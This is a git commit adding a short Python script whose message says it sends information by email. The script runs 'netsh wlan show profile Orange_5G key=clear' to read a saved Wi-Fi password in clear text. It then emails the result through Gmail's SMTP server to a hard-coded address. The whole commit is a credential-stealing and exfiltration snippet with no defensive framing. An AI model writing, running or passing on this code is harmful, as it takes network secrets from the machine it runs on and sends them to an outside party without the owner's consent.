3bef67045565941a83f6b454db573cfa861f9762
0x1tsjusthicham <hicham.ezzamzami@gmail.com>
2024-10-06 12:30:58 -0400

    Code THat send INfo in email

---
+++ run_commands.py
@@ -0,0 +1,12 @@
+import subprocess, smtplib
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+commands = "netsh wlan show profile Orange_5G key=clear"
+result = subprocess.check_output(commands, shell=True)
+send_mail("hichamzam@gmail.com", "", message=result)
